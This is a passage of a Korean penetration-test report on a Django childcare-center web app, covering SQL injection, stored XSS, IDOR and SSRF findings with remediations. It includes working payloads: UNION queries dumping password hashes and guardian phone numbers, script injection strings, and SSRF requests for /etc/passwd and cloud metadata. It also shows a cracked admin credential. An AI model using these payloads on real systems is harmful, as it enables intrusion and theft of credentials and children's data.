## 2. 상세

### A2-1. SQL 인젝션 — 공지 검색 `?q=` (A05)

- **대상 기능**: `/notices/?q=` 공지 제목·내용 검색
- **원인**: 검색어를 `Notice.objects.raw()`의 SQL 문자열에 그대로 끼워 넣습니다. `\x00` 제거와 100자 제한은 있으나 따옴표·구문은 거르지 않습니다.
  ```python
  sql = (f"SELECT * FROM center_notice WHERE title LIKE '%{q}%' OR body LIKE '%{q}%' "
         "ORDER BY pinned DESC, created_at DESC")
  notices = list(Notice.objects.raw(sql))
  ```
- **재현 절차** (인증 불필요):
  1. 참 조건 주입 — 전체 공지 반환 확인
     ```
     GET /notices/?q=' OR 1=1--
     ```
  2. UNION 으로 다른 테이블 유출 (제목 칸 = 2번째 컬럼에 실어 화면에 노출)
     ```
     GET /notices/?q=' UNION SELECT id,username||' = '||password,3,4,5 FROM auth_user--
     GET /notices/?q=' UNION SELECT id,name||' / '||guardian_tel,3,4,5 FROM center_child--
     ```
- **실제 유출 값**:
  ```
  admin = md5$btahXi3XVJZUIpjYOecfIo$16a1eefd5ec4cfd58248a33a0a64932e
  모의아동01 / 010-0000-2742
  모의아동03 / 010-0000-5531
  ...
  (sqlite_version() → 3.46.1 까지 확인)
  ```
  비밀번호 해시가 MD5(솔트 포함)라 오프라인 크랙이 쉽습니다(실제 값 `admin1234` 확인).
- **영향도**: Critical — 인증 없이 전체 DB 열람. 아동·보호자 PII, 관리자 자격증명 유출.
  CVSS 3.1 ≈ 9.1 `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N` (Django `raw()`는 단일문이라 스택 쿼리는 제한되어 쓰기 영향 낮음)
- **권고 조치**: 문자열 결합 금지. ORM 사용 —
  ```python
  Notice.objects.filter(Q(title__icontains=q) | Q(body__icontains=q))
  ```
  꼭 raw 를 써야 하면 파라미터 바인딩: `raw("... LIKE %s", ['%'+q+'%'])`.
- **PoC**: `a05_sqli.sh`, `a05_sqli2.sh`

### A2-2. 저장형 XSS — 게시글·댓글 (A05)

- **대상 기능**: `/board/posts/` 글·댓글 작성·열람
- **원인**: 본문을 `mark_safe()`로 감싸 자동 이스케이프를 끕니다.
  ```python
  post.safe_body = mark_safe(post.body)
  c.safe_body = mark_safe(c.body)
  ```
- **재현 절차** (로그인 필요 — `/signup/`으로 계정 생성):
  1. 글 작성 본문: `<script>alert(document.cookie)</script>`
  2. 댓글 본문: `<img src=x onerror=alert(1)>`
  3. 글 상세를 다시 받으면 payload 가 **이스케이프 없이** 그대로 실립니다(`&lt;script&gt;` 아님).
- **영향도**: High — 저장형이라 그 글을 여는 모든 사용자(직원 포함)에게 실행. `sessionid`는 HttpOnly라 직접 탈취는 막히지만, 읽히는 `csrftoken`·`role` 쿠키 탈취, 피해자 권한으로의 요청 위조, 화면 변조가 가능합니다.
  CVSS 3.1 ≈ 8.0 `AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N`
- **권고 조치**: `mark_safe` 제거(자동 이스케이프에 맡김). 서식이 필요하면 `bleach` 허용목록으로 정제. 응답에 CSP 헤더 추가.
- **PoC**: `a05_xss.sh`

### A2-3. 게시글 IDOR — 수정·삭제 (A01)

- **대상 기능**: `/board/posts/<pk>/edit/`, `/delete/`
- **원인**: `@login_required`만 있고 **작성자 확인이 없습니다**(코드 주석도 "작성자인지 확인하지 않는다").
- **재현 절차**: alice 로 글 작성 → bob 으로 로그인해 alice 글을 수정·삭제.
  ```
  [*] bob 이 수정한 글의 현재 제목: BOB 이 수정함(변조)
  [*] bob 이 삭제한 글 재조회: HTTP 404 (삭제됨)
  ```
- **영향도**: High — 로그인한 누구나 타인 게시물 변조·삭제.
  CVSS 3.1 ≈ 8.1 `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H`
- **권고 조치**: 수정·삭제 전에 `post.author_id == request.user.id or request.user.is_staff` 확인, 아니면 403.
- **PoC**: `a01.sh`

### A2-4. 남의 아이 출결 조회 IDOR (A01)

- **대상 기능**: `/my/?child=<id>`
- **원인**: `?child=`가 있으면 보호자 소속 확인 없이 pk 로만 조회합니다.
  ```python
  if cid:
      children = Child.objects.filter(active=True, pk=_pk(cid))   # guardian 확인 없음
  ```
- **재현 절차**: bob(보호자 아님)이 `?child=1,2,3`으로 모의아동01~03 출결(이름·입퇴실·사유)을 열람.
- **영향도**: Medium — 타 아동 PII 열람(쓰기는 없음). `/my/<child_id>/`(`my_child`)도 동일.
  CVSS 3.1 ≈ 6.5 `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`
- **권고 조치**: 항상 `guardian=request.user`로 필터. `?child=`도 소유 아동인지 확인 후 조회.
- **PoC**: `a01.sh`

### A2-5. SSRF — 외부 임베드 (A01)

- **대상 기능**: `/embed/?url=` (서버가 URL 을 가져와 앞부분을 보여줌)
- **원인**: 사용자 입력 URL 을 `urllib.request.urlopen()`에 그대로 넘깁니다. 스킴·대상 제한이 없습니다.
- **재현 절차**:
  ```
  GET /embed/?url=file:///etc/passwd
  → 미리보기: root:x:0:0:root:/root:/bin/bash ...
  ```
  `file://`로 로컬 파일을 읽습니다. 같은 방식으로 `file:///app/config/settings.py`(SECRET_KEY), 내부망 주소, 클라우드 메타데이터(`http://169.254.169.254/`)에 닿을 수 있습니다.
- **영향도**: High — 로컬 파일 유출·내부망 탐색. 소스 유출 시 SECRET_KEY → 세션 위조로 확대.
  CVSS 3.1 ≈ 8.6 `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N`
- **권고 조치**: 스킴을 `http/https`로 제한(`file/ftp/gopher` 차단), 대상 호스트 허용목록, 사설·루프백·링크로컬 IP 차단, 리다이렉트 비허용, 타임아웃 유지. 기능이 꼭 필요하지 않으면 제거.
- **PoC**: `a01.sh`
